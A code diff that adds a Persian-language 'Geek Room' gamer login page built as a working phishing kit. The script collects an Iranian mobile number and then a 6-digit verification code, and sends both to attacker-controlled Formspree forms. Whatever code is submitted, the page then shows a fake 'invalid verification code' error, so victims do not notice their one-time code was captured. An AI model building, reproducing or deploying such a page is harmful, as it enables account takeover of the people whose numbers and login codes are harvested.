@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geek Room | ورود به محفل گیمرها</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Orbitron', 'Tahoma', monospace;
+            background: radial-gradient(circle at 20% 50%, #0a0a0f, #030308);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 255, 255, 0.03) 2px,
+                rgba(0, 255, 255, 0.03) 4px
+            );
+            animation: scan 10s linear infinite;
+            pointer-events: none;
+        }
+        
+        @keyframes scan {
+            0% { transform: translateY(-50%); }
+            100% { transform: translateY(0%); }
+        }
+        
+        .neon-bubble {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.3;
+            animation: float 20s infinite;
+        }
+        
+        .bubble1 { background: #ff00ff; top: -100px; left: -100px; }
+        .bubble2 { background: #00ffff; bottom: -100px; right: -100px; animation-delay: 5s; }
+        .bubble3 { background: #ffff00; top: 50%; left: 50%; width: 200px; height: 200px; animation-delay: 10s; }
+        
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -30px) scale(1.1); }
+            66% { transform: translate(-20px, 20px) scale(0.9); }
+        }
+        
+        .container {
+            background: rgba(10, 10, 20, 0.7);
+            backdrop-filter: blur(10px);
+            border: 2px solid #00ffff;
+            border-radius: 25px;
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3), inset 0 0 20px rgba(0, 255, 255, 0.05);
+            animation: borderPulse 2s infinite alternate;
+        }
+        
+        @keyframes borderPulse {
+            0% { border-color: #00ffff; box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
+            100% { border-color: #ff00ff; box-shadow: 0 0 40px rgba(255, 0, 255, 0.5); }
+        }
+        
+        .header { text-align: center; margin-bottom: 30px; }
+        
+        h1 {
+            font-size: 48px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00ffff, #ff00ff, #ffff00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+            letter-spacing: 3px;
+            animation: textGlitch 3s infinite;
+        }
+        
+        @keyframes textGlitch {
+            0%, 100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
+            33% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
+            66% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
+        }
+        
+        .subtitle { color: #00ffff; font-size: 12px; letter-spacing: 2px; margin-top: 10px; text-shadow: 0 0 5px #00ffff; }
+        
+        .input-group { margin-bottom: 25px; position: relative; }
+        
+        label { display: block; margin-bottom: 8px; color: #00ffff; font-size: 14px; font-weight: bold; letter-spacing: 1px; text-shadow: 0 0 5px #00ffff; }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #00ffff;
+            border-radius: 10px;
+            font-size: 16px;
+            color: #00ffff;
+            font-family: 'Orbitron', monospace;
+            transition: all 0.3s;
+            outline: none;
+        }
+        
+        input:focus { border-color: #ff00ff; box-shadow: 0 0 15px rgba(255, 0, 255, 0.5); background: rgba(0, 0, 0, 0.8); }
+        input::placeholder { color: rgba(0, 255, 255, 0.4); font-size: 12px; }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #00ffff, #ff00ff);
+            border: none;
+            border-radius: 10px;
+            color: #0a0a0f;
+            font-family: 'Orbitron', monospace;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: 0.5s;
+        }
+        
+        button:hover::before { left: 100%; }
+        button:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(0, 255, 255, 0.7); }
+        
+        .message {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 12px;
+            display: none;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        .error { background: rgba(255, 0, 0, 0.2); border: 1px solid #ff0000; color: #ff6666; text-shadow: 0 0 5px #ff0000; }
+        .success { background: rgba(0, 255, 0, 0.2); border: 1px solid #00ff00; color: #66ff66; text-shadow: 0 0 5px #00ff00; }
+        
+        .step { display: none; animation: fadeIn 0.5s; }
+        .step.active { display: block; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .glow-text { text-align: center; color: #ffff00; font-size: 11px; margin-top: 15px; text-shadow: 0 0 5px #ffff00; }
+        
+        @media (max-width: 500px) {
+            .container { margin: 20px; padding: 25px; }
+            h1 { font-size: 32px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="neon-bubble bubble1"></div>
+<div class="neon-bubble bubble2"></div>
+<div class="neon-bubble bubble3"></div>
+
+<div class="container">
+    <div class="header">
+        <h1>⚡ GEEK ROOM ⚡</h1>
+        <div class="subtitle">[[ ENTER THE MATRIX ]]</div>
+    </div>
+
+    <!-- مرحله 1: دریافت شماره همراه -->
+    <div id="step1" class="step active">
+        <div class="input-group">
+            <label>📱 [ AGENT ID / PHONE ]</label>
+            <input type="tel" id="phone" placeholder="09123456789" maxlength="11">
+        </div>
+        <button id="submitPhoneBtn">▶ LOGIN / CONNECT</button>
+        <div id="message1" class="message"></div>
+        <div class="glow-text">⚡ YOUR PHONE WILL BE SENT TO ADMIN ⚡</div>
+    </div>
+
+    <!-- مرحله 2: دریافت کد تایید -->
+    <div id="step2" class="step">
+        <div class="input-group">
+            <label>🔐 [ ENTER 6-DIGIT ACCESS CODE ]</label>
+            <input type="text" id="code" placeholder="_ _ _ _ _ _" maxlength="6" autocomplete="off">
+        </div>
+        <button id="submitCodeBtn">✓ VERIFY / AUTHENTICATE</button>
+        <div id="message2" class="message"></div>
+        <div class="glow-text">⚠ ANY CODE YOU ENTER WILL BE SENT TO ADMIN ⚠</div>
+    </div>
+</div>
+
+<!-- کتابخانه Formspree Ajax -->
+<script src="https://unpkg.com/@formspree/ajax@1"></script>
+
+<script>
+    // ========== آیدی فرم‌های شما ==========
+    const PHONE_FORM_ID = 'xlgkgkgw';   // فرم شماره همراه
+    const CODE_FORM_ID = 'xqeoeoql';    // فرم کد تایید
+    
+    let lastPhoneNumber = "";
+    let phoneFormInitialized = false;
+    let codeFormInitialized = false;
+    
+    // ========== مقداردهی اولیه فرم شماره ==========
+    function initPhoneForm() {
+        if (phoneFormInitialized) return;
+        
+        const phoneInput = document.getElementById('phone');
+        const submitBtn = document.getElementById('submitPhoneBtn');
+        const messageDiv = document.getElementById('message1');
+        
+        // ایجاد المنت فرم مجازی
+        const formElement = document.createElement('form');
+        formElement.id = 'phone-form-ajax';
+        document.body.appendChild(formElement);
+        
+        // مقداردهی Formspree
+        window.formspree = window.formspree || function() {
+            (formspree.q = formspree.q || []).push(arguments);
+        };
+        
+        formspree('initForm', {
+            formElement: '#phone-form-ajax',
+            formId: PHONE_FORM_ID,
+            onSuccess: (response) => {
+                showMessage(messageDiv, '✅ PHONE NUMBER SENT! CHECK YOUR EMAIL', 'success');
+                lastPhoneNumber = phoneInput.value.trim();
+                
+                setTimeout(() => {
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+                    document.getElementById('code').focus();
+                }, 1500);
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = '▶ LOGIN / CONNECT';
+            },
+            onError: (error) => {
+                console.error('Formspree error:', error);
+                showMessage(messageDiv, '⚠ TRANSMISSION FAILED! TRY AGAIN', 'error');
+                submitBtn.disabled = false;
+                submitBtn.textContent = '▶ LOGIN / CONNECT';
+            }
+        });
+        
+        // هندلر کلیک دکمه شماره
+        submitBtn.onclick = async () => {
+            const phone = phoneInput.value.trim();
+            
+            if (!phone || phone.length < 11 || !/^09[0-9]{9}$/.test(phone)) {
+                showMessage(messageDiv, '❌ INVALID AGENT ID! MUST BE 11 DIGITS', 'error');
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = '⏳ TRANSMITTING...';
+            
+            const formData = new FormData();
+            formData.append('phone', phone);
+            formData.append('_subject', '🎮 Geek Room - New Phone Number');
+            
+            const formElementForSubmit = document.querySelector('#phone-form-ajax');
+            formElementForSubmit.innerHTML = '';
+            for (let [key, value] of formData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                formElementForSubmit.appendChild(input);
+            }
+            
+            formElementForSubmit.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+        };
+        
+        phoneFormInitialized = true;
+    }
+    
+    // ========== مقداردهی اولیه فرم کد تایید ==========
+    function initCodeForm() {
+        if (codeFormInitialized) return;
+        
+        const codeInput = document.getElementById('code');
+        const submitBtn = document.getElementById('submitCodeBtn');
+        const messageDiv = document.getElementById('message2');
+        
+        // ایجاد المنت فرم مجازی
+        const formElement = document.createElement('form');
+        formElement.id = 'code-form-ajax';
+        document.body.appendChild(formElement);
+        
+        window.formspree = window.formspree || function() {
+            (formspree.q = formspree.q || []).push(arguments);
+        };
+        
+        formspree('initForm', {
+            formElement: '#code-form-ajax',
+            formId: CODE_FORM_ID,
+            onSuccess: (response) => {
+                showMessage(messageDiv, '✅ CODE SENT TO ADMIN!', 'success');
+                
+                // بعد از ارسال کد، پیام نامعتبر بودن را نشان بده
+                setTimeout(() => {
+                    showMessage(messageDiv, '❌ INVALID VERIFICATION CODE! ACCESS DENIED ❌', 'error');
+                }, 1000);
+                
+                submitBtn.disabled = false;
+                submitBtn.textContent = '✓ VERIFY / AUTHENTICATE';
+            },
+            onError: (error) => {
+                console.error('Formspree error:', error);
+                showMessage(messageDiv, '⚠ TRANSMISSION FAILED! TRY AGAIN', 'error');
+                submitBtn.disabled = false;
+                submitBtn.textContent = '✓ VERIFY / AUTHENTICATE';
+            }
+        });
+        
+        // هندلر کلیک دکمه کد
+        submitBtn.onclick = async () => {
+            const code = codeInput.value.trim();
+            
+            if (code.length !== 6 || isNaN(code)) {
+                showMessage(messageDiv, '❌ CODE MUST BE 6 DIGITS!', 'error');
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = '⏳ VERIFYING...';
+            
+            const formData = new FormData();
+            formData.append('code', code);
+            formData.append('phone', lastPhoneNumber);
+            formData.append('_subject', '🔐 Geek Room - Code Attempt');
+            
+            const formElementForSubmit = document.querySelector('#code-form-ajax');
+            formElementForSubmit.innerHTML = '';
+            for (let [key, value] of formData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                formElementForSubmit.appendChild(input);
+            }
+            
+            formElementForSubmit.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+        };
+        
+        codeFormInitialized = true;
+    }
+    
+    function showMessage(element, text, type) {
+        element.textContent = text;
+        element.className = `message ${type}`;
+        element.style.display = 'block';
+        setTimeout(() => {
+            element.style.display = 'none';
+        }, 3500);
+    }
+    
+    // محدود کردن ورودی به اعداد
+    document.getElementById('phone').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    });
+    document.getElementById('code').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    });
+    
+    // راه‌اندازی هر دو فرم بعد از لود صفحه
+    window.addEventListener('DOMContentLoaded', () => {
+        initPhoneForm();
+        initCodeForm();
+        console.log('🎮 Geek Room Loaded - Phone Form:', PHONE_FORM_ID, 'Code Form:', CODE_FORM_ID);
+    });
+</script>
+</body>
+</html>
